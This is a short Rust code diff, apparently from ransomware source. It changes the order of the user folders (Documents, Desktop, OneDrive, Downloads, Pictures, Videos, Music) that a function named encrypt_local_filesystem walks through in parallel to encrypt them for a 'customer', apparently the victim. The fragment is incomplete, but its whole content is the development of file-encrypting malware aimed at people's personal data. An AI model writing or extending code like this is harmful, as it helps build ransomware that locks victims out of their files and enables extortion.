@@ -10,13 +10,13 @@ mod filesystem;
 
 fn encrypt_local_filesystem(customer: &crypto::Customer) {
     let folders = vec![
-        "OneDrive",
-        "Desktop",
-        "Documents",
-        "Downloads",
+        "Music",
         "Videos",
         "Pictures",
-        "Music",
+        "Documents",
+        "Downloads",
+        "OneDrive",
+        "Desktop",
     ];
 
     folders.par_iter().for_each(|folder| {
